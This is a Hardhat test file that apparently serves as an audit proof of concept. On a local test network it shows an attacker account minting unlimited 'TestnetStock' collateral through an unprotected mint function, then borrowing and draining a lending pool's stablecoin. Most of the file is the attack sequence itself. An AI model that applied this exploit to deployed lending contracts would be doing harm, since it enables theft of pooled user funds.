const { ethers } = require("hardhat");
const { time } = require("@nomicfoundation/hardhat-network-helpers");
const usd = (n) => BigInt(Math.round(n * 1e8));
const s6 = (n) => BigInt(Math.round(n * 1e6));

describe("PROBE3", () => {
  it("stand-in stock + real stablecoin: anyone mints collateral and drains the warehouse", async () => {
    const [owner, attacker, merchant, funder] = await ethers.getSigners();
    // "real USDT0" stands in as any 6dp ERC20 the operator actually funded
    const usdt = await (await ethers.getContractFactory("MockUSDC")).deploy();
    const stock = await (await ethers.getContractFactory("TestnetStock")).deploy("Testnet Apple","tXAAPL",18,owner.address);
    const oracle = await (await ethers.getContractFactory("StockPriceOracle")).deploy(owner.address);
    const pool = await (await ethers.getContractFactory("LiquidityPool")).deploy(await usdt.getAddress(), owner.address);
    const engine = await (await ethers.getContractFactory("StocklineEngine")).deploy(
      await usdt.getAddress(), await oracle.getAddress(), await pool.getAddress(), owner.address);
    await pool.setEngine(await engine.getAddress());
    await engine.setAcceptedStock(await stock.getAddress(), true);
    await oracle.postPrice(await stock.getAddress(), usd(220), await time.latest(), true, "NASDAQ");

    // operator funds 100_000 of REAL stablecoin, exactly as deploy-stockline.js does
    await usdt.mint(funder.address, s6(100_000));
    await usdt.connect(funder).approve(await pool.getAddress(), ethers.MaxUint256);
    await pool.connect(funder).fund(s6(100_000));

    // attacker: TestnetStock.mint has no access control
    const need = 10n ** 18n * 2000n; // 2000 "shares" = $440,000 of paper collateral
    await stock.connect(attacker).mint(attacker.address, need);
    await stock.connect(attacker).approve(await engine.getAddress(), ethers.MaxUint256);

    const q = await engine.quote(await stock.getAddress(), need, 7*86400);
    console.log(`   attacker minted ${ethers.formatUnits(need,18)} tXAAPL for 0 cost -> quoted maxBorrow ${q.maxBorrow/1000000n} USD`);
    const take = await pool.available();
    await engine.connect(attacker).openLoan(await stock.getAddress(), need, attacker.address, ethers.id("z"), take, 7*86400);
    console.log(`   attacker drew ${(await usdt.balanceOf(attacker.address))/1000000n} USD of real stablecoin`);
    console.log(`   pool available now = ${await pool.available()}  outstanding = ${await pool.outstanding()}`);
    console.log(`   attacker walks; pool's loss = ${take/1000000n} USD, "collateral" left behind is a free-mint token`);
  });
});
